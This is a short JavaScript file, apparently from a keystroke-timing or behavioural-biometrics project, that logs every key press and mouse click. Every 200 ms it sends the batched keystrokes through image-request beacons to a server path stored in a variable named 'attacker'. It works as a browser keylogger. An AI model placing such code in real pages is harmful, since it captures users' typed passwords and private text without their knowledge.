
//NOTE: Not currently in use anywhere in the code

var buffer = [];
var attacker = '/soteria/listn2/'

function myFunction2(event, downup, contrl) {
    var timestamp = Date.now();
    var x = event.key;
    var stroke = {
        k: x,
        t: timestamp,
        r: downup,
        s: contrl,
    };
   buffer.push(stroke);
//        var data = encodeURIComponent(JSON.stringify(stroke));
//        new Image().src = '/soteria/listn2/' + data;
}


function mouseClick2(event, type, contrl){
    var timestamp = Date.now();
    var mouse_click = {
    t: timestamp,
    r: type,
    c: contrl
    };
        var data = encodeURIComponent(JSON.stringify(mouse_click));
        //alert(type+'|'+timestamp);
        new Image().src = '/soteria/mlisten' + data;
};


window.setInterval(function() {
    if (buffer.length > 0) {
    	//alert(buffer.join());
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);